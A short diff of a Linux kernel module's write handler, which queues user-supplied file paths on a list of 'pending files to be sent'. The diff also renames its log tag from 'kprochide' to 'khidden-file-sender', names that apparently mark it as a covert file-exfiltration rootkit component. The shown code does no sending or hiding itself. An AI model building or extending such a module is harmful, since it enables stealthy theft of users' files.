@@ -56,15 +56,16 @@ static ssize_t device_write(struct file *fs, const char *buffer, size_t len, lof
     //       it with a string terminator.
     memcpy(file_path, buffer, len);
     file_path[len - 1] = 0x00;
-    
+
     new_file_info->file_path = file_path;
 
     mutex_lock(&pending_files_to_be_sent_mutex);
     INIT_LIST_HEAD(&new_file_info->l_head);
+    // TODO: should be tail or head?
     list_add_tail(&new_file_info->l_head, &pending_files_to_be_sent);
     mutex_unlock(&pending_files_to_be_sent_mutex);
 
-    printk(KERN_INFO "kprochide: new pending file: %s\n", file_path);
+    printk(KERN_INFO "khidden-file-sender: new pending file: %s\n", file_path);
 
     return len;
 }
